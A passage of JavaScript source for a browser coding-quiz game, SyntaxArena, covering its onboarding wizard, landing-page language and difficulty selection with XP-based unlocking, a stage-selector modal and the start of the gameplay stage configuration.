    const camp = (profile && profile.campaign && profile.campaign[lang]) || {};
    const completedTiers = (profile && profile.completedTiers) || {};

    if (diff === 'intermediate') {
      const isBegCleared = camp.beginnerStars > 0 || camp.unlockedTier === 'intermediate' || camp.unlockedTier === 'expert' || completedTiers[lang + '_beginner'];
      if (!isBegCleared && xp < 1000) {
        AudioEngine.playError();
        UI.showToast(`🔒 Intermediate is locked! Complete Beginner first or earn 1,000 pts (You have ${xp.toLocaleString()} pts).`, 'info');
        return;
      }
    } else if (diff === 'expert') {
      const isIntCleared = camp.intermediateStars > 0 || camp.unlockedTier === 'expert' || completedTiers[lang + '_intermediate'];
      if (!isIntCleared && xp < 2500) {
        AudioEngine.playError();
        UI.showToast(`🔒 Expert is locked! Complete Intermediate first or earn 2,500 pts (You have ${xp.toLocaleString()} pts).`, 'info');
        return;
      }
    }

    this._state.difficulty = diff;
    const cards = Utils.qsa('#wizard-diff-grid .card-selectable');
    cards.forEach(c => {
      const isSelected = c.getAttribute('data-diff') === diff;
      c.classList.toggle('is-selected', isSelected);
      c.setAttribute('aria-checked', isSelected ? 'true' : 'false');
    });
  },

  _updateWizardDifficultyLocks() {
    const profile = State.get('activeProfile');
    const xp = (profile && (typeof profile.totalScore === 'number' ? profile.totalScore : profile.xp)) || 0;
    const lang = this._state.language || 'python';
    const camp = (profile && profile.campaign && profile.campaign[lang]) || {};
    const completedTiers = (profile && profile.completedTiers) || {};

    const diffs = ['beginner', 'intermediate', 'expert'];
    diffs.forEach(diff => {
      const card = Utils.qs(`#wizard-diff-grid .card-selectable[data-diff="${diff}"]`);
      if (!card) return;
      const indicator = card.querySelector('.selection-indicator');

      if (diff === 'beginner') {
        card.classList.remove('is-locked');
        card.removeAttribute('aria-disabled');
        if (indicator) indicator.textContent = '✓';
      } else if (diff === 'intermediate') {
        const isUnlocked = camp.beginnerStars > 0 || camp.unlockedTier === 'intermediate' || camp.unlockedTier === 'expert' || completedTiers[lang + '_beginner'] || xp >= 1000;
        card.classList.toggle('is-locked', !isUnlocked);
        if (!isUnlocked) {
          card.setAttribute('aria-disabled', 'true');
          if (indicator) indicator.textContent = '🔒';
        } else {
          card.removeAttribute('aria-disabled');
          if (indicator) indicator.textContent = '✓';
        }
      } else if (diff === 'expert') {
        const isUnlocked = camp.intermediateStars > 0 || camp.unlockedTier === 'expert' || completedTiers[lang + '_intermediate'] || xp >= 2500;
        card.classList.toggle('is-locked', !isUnlocked);
        if (!isUnlocked) {
          card.setAttribute('aria-disabled', 'true');
          if (indicator) indicator.textContent = '🔒';
        } else {
          card.removeAttribute('aria-disabled');
          if (indicator) indicator.textContent = '✓';
        }
      }
    });

    if (this._state.difficulty === 'intermediate') {
      const isBegCleared = camp.beginnerStars > 0 || camp.unlockedTier === 'intermediate' || camp.unlockedTier === 'expert' || completedTiers[lang + '_beginner'];
      if (!isBegCleared && xp < 1000) {
        this._selectDifficulty('beginner');
      }
    } else if (this._state.difficulty === 'expert') {
      const isIntCleared = camp.intermediateStars > 0 || camp.unlockedTier === 'expert' || completedTiers[lang + '_intermediate'];
      if (!isIntCleared && xp < 2500) {
        this._selectDifficulty('beginner');
      }
    }
  },

  /**
   * Navigate wizard to a specific step (1 to 4).
   * @param {number} stepNumber
   */
  goToStep(stepNumber) {
    const targetStep = Math.max(1, Math.min(4, stepNumber));
    this._state.currentStep = targetStep;

    if (targetStep === 3) {
      this._updateWizardDifficultyLocks();
    }

    // Update Step Indicator Nodes
    for (let i = 1; i <= 4; i++) {
      const node = Utils.qs(`#wizard-node-${i}`);
      if (node) {
        node.classList.remove('is-active', 'is-complete');
        if (i < targetStep) {
          node.classList.add('is-complete');
        } else if (i === targetStep) {
          node.classList.add('is-active');
        }
      }

      // Update Panes
      const pane = Utils.qs(`#wizard-pane-${i}`);
      if (pane) {
        pane.classList.toggle('is-active', i === targetStep);
      }
    }

    // Update Footer Buttons Visibility
    const btnToStep2 = Utils.qs('#btn-wizard-to-step2');
    const btnBackTo1 = Utils.qs('#btn-wizard-back-to-1');
    const btnToStep3 = Utils.qs('#btn-wizard-to-step3');
    const btnBackTo2 = Utils.qs('#btn-wizard-back-to-2');
    const btnToStep4 = Utils.qs('#btn-wizard-to-step4');
    const btnBackTo3 = Utils.qs('#btn-wizard-back-to-3');
    const btnEditChoices = Utils.qs('#btn-wizard-edit-choices');
    const btnConfirmSave = Utils.qs('#btn-wizard-confirm-save');
    const btnConfirmPlay = Utils.qs('#btn-wizard-confirm-play');

    // Hide all step buttons first
    [btnToStep2, btnBackTo1, btnToStep3, btnBackTo2, btnToStep4, btnBackTo3, btnEditChoices, btnConfirmSave, btnConfirmPlay].forEach(btn => {
      if (btn) btn.style.display = 'none';
    });

    // Show appropriate buttons for active step
    if (targetStep === 1) {
      if (btnToStep2) btnToStep2.style.display = 'inline-flex';
    } else if (targetStep === 2) {
      if (btnBackTo1) btnBackTo1.style.display = 'inline-flex';
      if (btnToStep3) btnToStep3.style.display = 'inline-flex';
    } else if (targetStep === 3) {
      if (btnBackTo2) btnBackTo2.style.display = 'inline-flex';
      if (btnToStep4) btnToStep4.style.display = 'inline-flex';
    } else if (targetStep === 4) {
      if (btnBackTo3) btnBackTo3.style.display = 'inline-flex';
      if (btnEditChoices) btnEditChoices.style.display = 'inline-flex';
      if (btnConfirmSave) btnConfirmSave.style.display = 'inline-flex';
      if (btnConfirmPlay) btnConfirmPlay.style.display = 'inline-flex';
    }

    // Step 4 Confirmation Render
    if (targetStep === 4) {
      this._renderStep4Summary();
    }

    // Focus top element of newly visible step
    requestAnimationFrame(() => {
      const activePane = Utils.qs(`#wizard-pane-${targetStep}`);
      if (activePane) {
        const focusable = activePane.querySelector('input, button:not([disabled])');
        if (focusable) focusable.focus();
      }
    });
  },

  /**
   * Render the summary preview inside Step 4.
   */
  _renderStep4Summary() {
    const avatarMeta = Profile.getAvatarMeta(this._state.avatarId);
    const summaryAvatarImg = Utils.qs('#summary-avatar-img');
    const summaryAvatarName = Utils.qs('#summary-avatar-name');
    const summaryUsername = Utils.qs('#summary-username');
    const summaryLang = Utils.qs('#summary-language');
    const summaryDiff = Utils.qs('#summary-difficulty');

    if (summaryAvatarImg) {
      summaryAvatarImg.src = `assets/images/${this._state.avatarId}.svg`;
      summaryAvatarImg.alt = avatarMeta.name;
    }
    if (summaryAvatarName) {
      summaryAvatarName.textContent = avatarMeta.name;
    }
    if (summaryUsername) {
      summaryUsername.textContent = this._state.username.trim() || 'Anonymous';
    }
    if (summaryLang) {
      const langNames = { python: 'Python 3', c: 'C (C99)', cpp: 'C++ (C++20)', java: 'Java 17' };
      summaryLang.textContent = langNames[this._state.language] || this._state.language.toUpperCase();
    }
    if (summaryDiff) {
      summaryDiff.textContent = this._state.difficulty.charAt(0).toUpperCase() + this._state.difficulty.slice(1);
    }
  },

  /**
   * Open the onboarding modal dialog.
   * @param {HTMLElement} [triggerElement=null]
   * @param {boolean} [autoNavigate=false]
   */
  open(triggerElement = null, autoNavigate = false) {
    this.init();

    // Check if new player or reset session
    const profile = State.get('activeProfile');
    const params = Router.getQueryParams();
    const isFirstTimeOrReset = !profile || !Profile.isOnboardingComplete(profile) || params.onboarding === '1' || params.reset === '1';

    if (!isFirstTimeOrReset && profile && profile.username && profile.username !== 'ScriptAdept') {
      this._state.username = profile.username;
      this._state.avatarId = profile.avatarId || 'cyber_fox';
      if (profile.preferences) {
        this._state.language = profile.preferences.language || 'python';
        this._state.difficulty = profile.preferences.difficulty || 'beginner';
      }
    } else {
      this._state.username = '';
      this._state.avatarId = 'cyber_fox';
      this._state.language = 'python';
      this._state.difficulty = 'beginner';
    }

    this._state.autoNavigateOnConfirm = Boolean(autoNavigate);

    // Sync form inputs
    const usernameInput = Utils.qs('#onboarding-username');
    if (usernameInput) {
      usernameInput.value = this._state.username;
      usernameInput.placeholder = 'Enter Call-sign (e.g. CodeNinja, ByteHero)...';
    }
    const feedbackEl = Utils.qs('#onboarding-username-feedback');
    if (feedbackEl) {
      feedbackEl.textContent = 'Call-sign is required (2–20 alphanumeric chars).';
      feedbackEl.style.color = 'var(--text-muted)';
    }

    this._selectAvatar(this._state.avatarId);
    this._selectLanguage(this._state.language);
    this._updateWizardDifficultyLocks();
    this._selectDifficulty(this._state.difficulty);

    // Start at Step 1
    this.goToStep(1);

    // Open Modal
    UI.openModal('modal-onboarding', triggerElement);
  },

  /**
   * Close without persisting unconfirmed edits.
   */
  close() {
    UI.closeModal('modal-onboarding');
  },

  /**
   * Confirm onboarding choices, save profile, update UI, and optionally launch arena.
   */
  _confirm(launchArena = false) {
    const valResult = Profile.validateUsername(this._state.username);
    if (!valResult.valid) {
      this.goToStep(1);
      const feedbackEl = Utils.qs('#onboarding-username-feedback');
      if (feedbackEl) {
        feedbackEl.textContent = valResult.error || 'Please correct your call-sign.';
        feedbackEl.style.color = 'var(--color-danger)';
      }
      return;
    }

    try {
      const activeProfile = State.get('activeProfile');
      if (activeProfile && activeProfile.id) {
        Profile.completeOnboarding(activeProfile.id, {
          username: this._state.username.trim(),
          avatarId: this._state.avatarId,
          language: this._state.language,
          difficulty: this._state.difficulty
        });
      } else {
        const newProf = Profile.create(this._state.username.trim(), this._state.avatarId, {
          language: this._state.language,
          difficulty: this._state.difficulty
        });
        newProf.onboardingComplete = true;
        const profiles = State.get('profiles') || [];
        State.set('profiles', [...profiles, newProf], false);
        State.set('activeProfile', newProf, true);
      }

      // Synchronize selection state in store
      State.set('selectedLanguage', this._state.language);
      State.set('selectedDifficulty', this._state.difficulty);

      // Update visible shell components
      UI.updateHeaderProfile();

      // Close modal
      this.close();

      // Clean query parameters from URL so future reloads don't re-trigger onboarding modal
      try {
        if (typeof window !== 'undefined' && window.history && window.history.replaceState) {
          const cleanUrl = window.location.pathname + (window.location.hash || '');
          window.history.replaceState({}, document.title, cleanUrl);
        }
      } catch (_) {}

      // Dispatch event for landing page synchronization
      window.dispatchEvent(new CustomEvent('onboarding:completed', {
        detail: {
          username: this._state.username.trim(),
          avatarId: this._state.avatarId,
          language: this._state.language,
          difficulty: this._state.difficulty
        }
      }));

      // Feedback toast
      UI.showToast(`Welcome to SyntaxArena, ${this._state.username.trim()}! Setup complete.`, 'success');

      // If user chose "Confirm & Start Playing" or launch was requested
      if (launchArena || this._state.autoNavigateOnConfirm) {
        setTimeout(() => {
          Router.navigateTo('game', {
            lang: this._state.language,
            diff: this._state.difficulty
          });
        }, 350);
      }
    } catch (err) {
      console.error('[Onboarding._confirm] Error saving profile:', err);
      UI.showToast('Could not save profile. Check storage permissions.', 'error');
    }
  }
};

/* --- End of js/onboarding.js --- */

/* --- Start of js/landing.js --- */
/**
 * SyntaxArena Landing Page Coordinator (Batch 3)
 * Manages language track selection, difficulty choice, hero actions,
 * progression showcase, mobile navigation, and onboarding trigger flow.
 * Source of truth: docs/MVP_SPEC.md & docs/ARCHITECTURE.md
 */








var LandingPage = window.LandingPage = {
  selectedLanguage: 'python',
  selectedDifficulty: 'beginner',

  /**
   * Initialize all landing page components and interactive sections.
   */
  init() {
    console.info('[SyntaxArena] Initializing Landing Page & Onboarding Coordinator...');

    // 1. Initialize Onboarding Module
    Onboarding.init();

    // 2. Restore or synchronize language & difficulty from profile/state
    this._initSelections();

    // 3. Bind Language Track cards
    this._bindLanguageSelection();

    // 4. Bind Difficulty selection cards and apply locks
    this._bindDifficultySelection();
    this._updateDifficultyLockStatus();

    // 5. Bind Hero and Header Call-To-Action buttons
    this._bindPlayActions();

    // 6. Bind Mobile Navigation Drawer
    this._bindMobileMenu();

    // 7. Update dynamic footer year
    this._updateFooterYear();

    // 8. Listen for onboarding completion to sync cards
    window.addEventListener('onboarding:completed', (e) => {
      if (e.detail) {
        if (e.detail.language) this.selectLanguage(e.detail.language, false);
        if (e.detail.difficulty) this.selectDifficulty(e.detail.difficulty, false);
      }
    });

    // 9. If query explicitly requests onboarding/reset (?onboarding=1/?reset=1), auto-open onboarding
    const params = Router.getQueryParams();
    const needsOnboarding = params.onboarding === '1' || params.reset === '1';
    if (needsOnboarding) {
      setTimeout(() => Onboarding.open(null, false), 250);
    }
  },

  /**
   * Determine initial selections from active profile or defaults.
   */
  _initSelections() {
    const profile = State.get('activeProfile');
    const prefs = profile && profile.preferences ? profile.preferences : {};

    this.selectedLanguage = prefs.language || State.get('selectedLanguage') || 'python';
    this.selectedDifficulty = prefs.difficulty || State.get('selectedDifficulty') || 'beginner';

    this.selectLanguage(this.selectedLanguage, false);
    this.selectDifficulty(this.selectedDifficulty, false);
  },

  /**
   * Bind selectable Language Track cards.
   */
  _bindLanguageSelection() {
    const cards = Utils.qsa('#language-tracks-container .card-selectable');
    cards.forEach(card => {
      const lang = card.getAttribute('data-lang');

      card.addEventListener('click', () => {
        AudioEngine.playClick();
        this.selectLanguage(lang, true);
      });

      card.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          AudioEngine.playClick();
          this.selectLanguage(lang, true);
        }
      });
    });
  },

  /**
   * Change selected language track.
   * @param {string} lang ('python'|'c'|'cpp'|'java')
   * @param {boolean} [saveState=true]
   */
  selectLanguage(lang, saveState = true) {
    if (!['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'].includes(lang)) return;
    this.selectedLanguage = lang;

    const cards = Utils.qsa('#language-tracks-container .card-selectable');
    cards.forEach(card => {
      const isSelected = card.getAttribute('data-lang') === lang;
      card.classList.toggle('is-selected', isSelected);
      card.setAttribute('aria-checked', isSelected ? 'true' : 'false');
    });

    // Update hero code preview to match selected language (if present)
    this._updateHeroPreview(lang);

    // Refresh difficulty locks since campaign progression varies per track
    this._updateDifficultyLockStatus();

    if (saveState) {
      State.set('selectedLanguage', lang);
      const profile = State.get('activeProfile');
      if (profile && profile.id) {
        Profile.updateProfile(profile.id, {
          preferences: { ...(profile.preferences || {}), language: lang }
        });
      }
    }
  },

  /**
   * Check whether a difficulty tier is unlocked for the specified language.
   * Beginner: always unlocked.
   * Intermediate: requires Beginner cleared OR >= 1,000 points.
   * Expert: requires Intermediate cleared OR >= 2,500 points.
   * @param {string} diff ('beginner'|'intermediate'|'expert')
   * @param {string} [lang]
   * @returns {{ unlocked: boolean, reason: string }}
   */
  isDifficultyUnlocked(diff, lang = this.selectedLanguage) {
    if (diff === 'beginner') {
      return { unlocked: true, reason: 'Open Tier' };
    }

    const profile = State.get('activeProfile') || {};
    const xp = (typeof profile.totalScore === 'number' ? profile.totalScore : profile.xp) || 0;
    const camp = (profile.campaign && profile.campaign[lang]) || {};
    const completedTiers = profile.completedTiers || {};

    if (diff === 'intermediate') {
      const clearedBeg = camp.beginnerStars > 0 || camp.unlockedTier === 'intermediate' || camp.unlockedTier === 'expert' || completedTiers[lang + '_beginner'];
      if (clearedBeg) {
        return { unlocked: true, reason: 'Beginner Completed' };
      }
      if (xp >= 1000) {
        return { unlocked: true, reason: 'Unlocked via Bonus Points (1,000+ XP)' };
      }
      return {
        unlocked: false,
        reason: `Intermediate is locked! Complete Beginner first or earn 1,000 pts (You have ${xp.toLocaleString()} pts)`
      };
    }

    if (diff === 'expert') {
      const clearedInt = camp.intermediateStars > 0 || camp.unlockedTier === 'expert' || completedTiers[lang + '_intermediate'];
      if (clearedInt) {
        return { unlocked: true, reason: 'Intermediate Completed' };
      }
      if (xp >= 2500) {
        return { unlocked: true, reason: 'Unlocked via Bonus Points (2,500+ XP)' };
      }
      return {
        unlocked: false,
        reason: `Expert is locked! Complete Intermediate first or earn 2,500 pts (You have ${xp.toLocaleString()} pts)`
      };
    }

    return { unlocked: true, reason: '' };
  },

  /**
   * Update visual lock badges, indicators, and status on difficulty cards.
   */
  _updateDifficultyLockStatus() {
    const diffs = ['beginner', 'intermediate', 'expert'];
    let needResetToBeginner = false;

    diffs.forEach(diff => {
      const card = Utils.qs(`#difficulty-cards-container .card-selectable[data-diff="${diff}"]`);
      const badge = Utils.qs(`#diff-badge-${diff}`);
      const statusText = Utils.qs(`#diff-status-${diff}`);
      const indicator = card ? card.querySelector('.selection-indicator') : null;
      const lockInfo = this.isDifficultyUnlocked(diff, this.selectedLanguage);

      if (!card) return;

      if (!lockInfo.unlocked) {
        card.classList.add('is-locked');
        card.classList.remove('is-selected');
        card.setAttribute('aria-disabled', 'true');
        card.setAttribute('aria-checked', 'false');
        if (indicator) {
          indicator.textContent = '🔒';
        }
        if (badge) {
          badge.textContent = diff === 'intermediate' ? '🔒 Gate: Beginner or 1,000 Pts' : '🔒 Gate: Intermediate or 2,500 Pts';
        }
        if (statusText) {
          statusText.textContent = 'Locked';
          statusText.style.color = 'var(--text-muted)';
          statusText.style.fontWeight = 'normal';
        }
        if (this.selectedDifficulty === diff) {
          needResetToBeginner = true;
        }
      } else {
        card.classList.remove('is-locked');
        card.removeAttribute('aria-disabled');
        const isSelected = this.selectedDifficulty === diff;
        card.classList.toggle('is-selected', isSelected);
        card.setAttribute('aria-checked', isSelected ? 'true' : 'false');
        if (indicator) {
          indicator.textContent = '✓';
        }
        if (badge) {
          if (diff === 'beginner') {
            badge.textContent = 'Open Tier';
          } else {
            badge.textContent = lockInfo.reason.includes('Bonus') ? '🔓 Unlocked (Bonus Pts)' : '✓ Unlocked';
          }
        }
        if (statusText) {
          if (isSelected) {
            statusText.textContent = 'Active Selection';
            statusText.style.color = 'var(--color-success)';
            statusText.style.fontWeight = '700';
          } else {
            statusText.textContent = 'Click to Select';
            statusText.style.color = 'var(--text-muted)';
            statusText.style.fontWeight = 'normal';
          }
        }
      }
    });

    if (needResetToBeginner) {
      this.selectDifficulty('beginner', true);
    }
  },

  /**
   * Bind selectable Difficulty cards.
   */
  _bindDifficultySelection() {
    const cards = Utils.qsa('#difficulty-cards-container .card-selectable');
    cards.forEach(card => {
      const diff = card.getAttribute('data-diff');

      card.addEventListener('click', () => {
        this.selectDifficulty(diff, true);
      });

      card.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          this.selectDifficulty(diff, true);
        }
      });
    });
  },

  /**
   * Change selected difficulty tier with gating check.
   * @param {string} diff ('beginner'|'intermediate'|'expert')
   * @param {boolean} [saveState=true]
   */
  selectDifficulty(diff, saveState = true) {
    if (!['beginner', 'intermediate', 'expert'].includes(diff)) return;

    const lockStatus = this.isDifficultyUnlocked(diff, this.selectedLanguage);
    if (!lockStatus.unlocked) {
      AudioEngine.playError();
      UI.showToast(lockStatus.reason, 'info');
      return;
    }

    AudioEngine.playClick();
    this.selectedDifficulty = diff;

    const cards = Utils.qsa('#difficulty-cards-container .card-selectable');
    cards.forEach(card => {
      const cardDiff = card.getAttribute('data-diff');
      const isSelected = cardDiff === diff;
      card.classList.toggle('is-selected', isSelected);
      card.setAttribute('aria-checked', isSelected ? 'true' : 'false');

      const statusText = Utils.qs(`#diff-status-${cardDiff}`);
      if (statusText) {
        if (isSelected) {
          statusText.textContent = 'Active Selection';
          statusText.style.color = 'var(--color-success)';
          statusText.style.fontWeight = '700';
        } else {
          const lStatus = this.isDifficultyUnlocked(cardDiff, this.selectedLanguage);
          statusText.textContent = lStatus.unlocked ? 'Click to Select' : 'Locked';
          statusText.style.color = 'var(--text-muted)';
          statusText.style.fontWeight = 'normal';
        }
      }
    });

    if (saveState) {
      State.set('selectedDifficulty', diff);
      const profile = State.get('activeProfile');
      if (profile && profile.id) {
        Profile.updateProfile(profile.id, {
          preferences: { ...(profile.preferences || {}), difficulty: diff }
        });
      }
    }
  },

  /**
   * Update hero indicators if elements exist (safely no-op if removed).
   */
  _updateHeroPreview(lang) {
    const previewFilename = Utils.qs('#hero-preview-filename');
    const previewCode = Utils.qs('#hero-preview-code');
    const previewLangBadge = Utils.qs('#hero-preview-lang-tag');
    if (!previewFilename && !previewCode && !previewLangBadge) return;

    const meta = {
      python:     { filename: 'challenge_01.py', badge: 'Python 3.10+', tagClass: 'tag-python' },
      c:          { filename: 'challenge_01.c', badge: 'C (C99)', tagClass: 'tag-c' },
      cpp:        { filename: 'challenge_01.cpp', badge: 'C++ (C++20)', tagClass: 'tag-cpp' },
      java:       { filename: 'Challenge01.java', badge: 'Java 17', tagClass: 'tag-java' },
      cyber:      { filename: 'exploit_01.sh', badge: 'Cyber & Linux', tagClass: 'tag-cyber' },
      javascript: { filename: 'solution_01.js', badge: 'JavaScript ES2024', tagClass: 'tag-javascript' },
      rust:       { filename: 'main_01.rs', badge: 'Rust 2021', tagClass: 'tag-rust' },
      sql:        { filename: 'query_01.sql', badge: 'ANSI SQL', tagClass: 'tag-sql' }
    };
    const currentMeta = meta[lang] || meta.python;
    if (previewFilename) previewFilename.textContent = currentMeta.filename;
    if (previewLangBadge) {
      previewLangBadge.textContent = currentMeta.badge;
      previewLangBadge.className = `tag-lang ${currentMeta.tagClass}`;
    }
  },

  /**
   * Bind primary Play and Start buttons.
   */
  _bindPlayActions() {
    const playButtons = [
      Utils.qs('#btn-hero-start'),
      Utils.qs('#btn-nav-play'),
      Utils.qs('#btn-mobile-play'),
      Utils.qs('#btn-daily-cta'),
      Utils.qs('#btn-challenges-start')
    ].filter(Boolean);

    playButtons.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        AudioEngine.playClick();
        this.handlePlayAction(btn);
      });
    });

    // Secondary Smooth Scroll Actions
    const exploreBtns = Utils.qsa('[data-scroll-to]');
    exploreBtns.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        AudioEngine.playClick();
        const targetId = btn.getAttribute('data-scroll-to');
        const targetEl = Utils.qs(targetId);
        if (targetEl) {
          targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      });
    });
  },

  /**
   * Evaluate player profile readiness and open stage selector modal or onboarding.
   * @param {HTMLElement} [triggerEl=null]
   */
  handlePlayAction(triggerEl = null) {
    const activeProfile = State.get('activeProfile');
    const isComplete = Profile.isOnboardingComplete(activeProfile);

    if (!isComplete) {
      // First-time player: open guided onboarding wizard
      Onboarding.open(triggerEl, true);
    } else {
      // Open Stage Selection Modal with 4 bite-sized stages & boss stage
      this.openStageSelectorModal(this.selectedLanguage, this.selectedDifficulty);
    }
  },

  /**
   * Open the interactive Stage Selector Roadmap Modal for the chosen track and tier.
   * @param {string} lang
   * @param {string} diff
   */
  openStageSelectorModal(lang, diff) {
    const modal = Utils.qs('#modal-stage-selector');
    const stageGrid = Utils.qs('#modal-stage-grid');
    const tag = Utils.qs('#modal-stage-track-tag');
    const marathonLink = Utils.qs('#btn-modal-stage-marathon');
    const closeBtn = Utils.qs('#btn-close-stage-modal');
    const cancelBtn = Utils.qs('#btn-cancel-stage-modal');

    if (!modal || !stageGrid) {
      Router.navigateTo('game', { lang, diff });
      return;
    }

    const meta = {
      python: 'Python 3', c: 'C', cpp: 'C++', java: 'Java',
      cyber: 'Cyber & Linux', javascript: 'JavaScript', rust: 'Rust', sql: 'SQL'
    };
    const langName = meta[lang] || 'Python 3';
    const diffCapitalized = diff.charAt(0).toUpperCase() + diff.slice(1);

    if (tag) tag.textContent = `${langName} • ${diffCapitalized}`;
    if (marathonLink) marathonLink.href = `game.html?lang=${lang}&diff=${diff}&stage=marathon`;

    const profile = State.get('activeProfile') || Profile.getActiveProfile() || {};
    const stageStars = profile.stageStars || {};
    const completedStages = profile.completedStages || {};

    const STAGES = [
      { id: 1, title: 'Stage 1: Core Fundamentals', desc: 'Questions 1–5 • ~3 mins', focus: 'Variables & Flow', isBoss: false },
      { id: 2, title: 'Stage 2: Core Logic', desc: 'Questions 6–10 • ~3 mins', focus: 'Mutability & Loops', isBoss: false },
      { id: 3, title: 'Stage 3: Control Flow', desc: 'Questions 11–15 • ~3 mins', focus: 'Conditionals & Branching', isBoss: false },
      { id: 4, title: 'Stage 4: 💀 MINI-BOSS', desc: 'Questions 16–20 • ~3 mins', focus: 'Syntax Crucible I', isBoss: true },
      { id: 5, title: 'Stage 5: Data Structures', desc: 'Questions 21–25 • ~3 mins', focus: 'Collections & Memory', isBoss: false },
      { id: 6, title: 'Stage 6: Systems Logic', desc: 'Questions 26–30 • ~3 mins', focus: 'Algorithms & State', isBoss: false },
      { id: 7, title: 'Stage 7: Advanced Patterns', desc: 'Questions 31–35 • ~3 mins', focus: 'Architecture & OOP', isBoss: false },
      { id: 8, title: 'Stage 8: 💀 APEX FINAL BOSS', desc: 'Questions 36–40 • ~3 mins', focus: 'The Master Crucible', isBoss: true }
    ];

    stageGrid.innerHTML = '';
    STAGES.forEach((stg) => {
      const stageKey = `${lang}_${diff}_stage_${stg.id}`;
      const stars = stageStars[stageKey] || 0;
      const isCleared = !!completedStages[stageKey];

      // Gating: Stage 1 is always unlocked. Stage N unlocks strictly when Stage N-1 has all 3 stars (no level bypass)
      let isUnlocked = stg.id === 1;
      if (!isUnlocked) {
        const prevKey = `${lang}_${diff}_stage_${stg.id - 1}`;
        const prevStars = stageStars[prevKey] || 0;
        isUnlocked = prevStars >= 3;
      }

      const card = document.createElement('a');
      card.className = `stage-card ${stg.isBoss ? 'is-boss' : ''} ${!isUnlocked ? 'is-locked' : ''}`;
      if (isUnlocked) {
        card.href = `game.html?lang=${lang}&diff=${diff}&stage=${stg.id}`;
      } else {
        card.setAttribute('aria-disabled', 'true');
      }

      card.innerHTML = `
        <div>
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
            <span class="badge ${stg.isBoss ? 'badge-coral' : isCleared ? 'badge-emerald' : 'badge-neutral'}" style="font-size: 10px;">
              ${stg.isBoss ? (stg.id === 8 ? '💀 Apex Boss' : '💀 Mini-Boss') : `Stage ${stg.id} / 8`}
            </span>
            <div class="star-rating-display" style="font-size: 14px;">
              ${'⭐'.repeat(stars)}<span style="opacity: 0.25;">${'⭐'.repeat(3 - stars)}</span>
            </div>
          </div>
          <h4 style="margin: 0.25rem 0; font-size: var(--text-sm); font-family: var(--font-display); color: ${stg.isBoss ? 'var(--color-coral)' : 'var(--text-primary)'};">
            ${stg.title}
          </h4>
          <p style="font-size: 11px; color: var(--text-secondary); margin-bottom: 0.5rem; line-height: 1.4;">
            ${stg.desc} • ${stg.focus}
          </p>
        </div>
        <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--border-subtle); padding-top: 0.5rem; font-size: 11px;">
          <span style="color: ${isUnlocked ? (isCleared ? 'var(--color-success)' : 'var(--color-primary)') : 'var(--text-muted)'}; font-weight: 700;">
            ${!isUnlocked ? '🔒 Locked (Need 3★ on Stage ' + (stg.id - 1) + ')' : isCleared ? '✓ Cleared' : '▶ Play Stage'}
          </span>
          <span style="color: var(--text-muted); font-size: 10px;">5 Questions</span>
        </div>
      `;

      card.addEventListener('click', (e) => {
        if (!isUnlocked) {
          e.preventDefault();
          AudioEngine.playError();
          UI.showToast(`🔒 Stage ${stg.id} is locked! Earn all 3 stars (⭐⭐⭐) on Stage ${stg.id - 1} to unlock.`, 'info');
        } else {
          AudioEngine.playClick();
        }
      });

      stageGrid.appendChild(card);
    });

    const closeModal = () => {
      modal.classList.remove('is-open');
      modal.setAttribute('aria-hidden', 'true');
    };

    if (closeBtn) closeBtn.onclick = closeModal;
    if (cancelBtn) cancelBtn.onclick = closeModal;
    modal.onclick = (e) => {
      if (e.target === modal) closeModal();
    };

    modal.classList.add('is-open');
    modal.setAttribute('aria-hidden', 'false');
  },

  /**
   * Mobile menu toggle drawer.
   */
  _bindMobileMenu() {
    const menuBtn = Utils.qs('#btn-mobile-menu');
    const drawer = Utils.qs('#mobile-nav-drawer');

    if (!menuBtn || !drawer) return;

    menuBtn.addEventListener('click', () => {
      AudioEngine.playClick();
      const isOpen = drawer.classList.contains('is-open');
      const nextState = !isOpen;

      drawer.classList.toggle('is-open', nextState);
      menuBtn.setAttribute('aria-expanded', nextState ? 'true' : 'false');
      menuBtn.setAttribute('aria-label', nextState ? 'Close navigation menu' : 'Open navigation menu');
    });

    // Close on any navigation click inside drawer
    const drawerLinks = drawer.querySelectorAll('a, button');
    drawerLinks.forEach(link => {
      link.addEventListener('click', () => {
        drawer.classList.remove('is-open');
        menuBtn.setAttribute('aria-expanded', 'false');
      });
    });

    // Close on Escape key
    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && drawer.classList.contains('is-open')) {
        drawer.classList.remove('is-open');
        menuBtn.setAttribute('aria-expanded', 'false');
        menuBtn.focus();
      }
    });
  },

  /**
   * Generate current local copyright year.
   */
  _updateFooterYear() {
    const yearEl = Utils.qs('#copyright-year');
    if (yearEl) {
      yearEl.textContent = new Date().getFullYear();
    }
  }
};

/* --- End of js/landing.js --- */

/* --- Start of js/gameplay.js --- */
/**
 * SyntaxArena Gameplay Controller & UI Coordinator (Batch 5)
 * Binds DOM arena interface to the core GameEngine, managing question rendering,
 * multi-format inputs, timer countdown, hint drawers, Second Chance retries,
 * exit confirmation, and results navigation.
 * Source of truth: docs/GAME_RULES.md, docs/ARCHITECTURE.md, docs/QUESTION_SCHEMA.md
 */











var HINT_PENALTIES = window.HINT_PENALTIES = {
  beginner: 25,
  intermediate: 60,
  expert: 100
};

var STAGE_CONFIG = window.STAGE_CONFIG = {
  1: { id: 1, name: 'Stage 1: Core Fundamentals', questionsCount: 5, startIndex: 0, endIndex: 5, isBoss: false },
  2: { id: 2, name: 'Stage 2: Core Logic', questionsCount: 5, startIndex: 5, endIndex: 10, isBoss: false },
  3: { id: 3, name: 'Stage 3: Control Flow', questionsCount: 5, startIndex: 10, endIndex: 15, isBoss: false },
  4: { id: 4, name: 'Stage 4: 💀 MINI-BOSS', questionsCount: 5, startIndex: 15, endIndex: 20, isBoss: true },
  5: { id: 5, name: 'Stage 5: Data Structures', questionsCount: 5, startIndex: 20, endIndex: 25, isBoss: false },
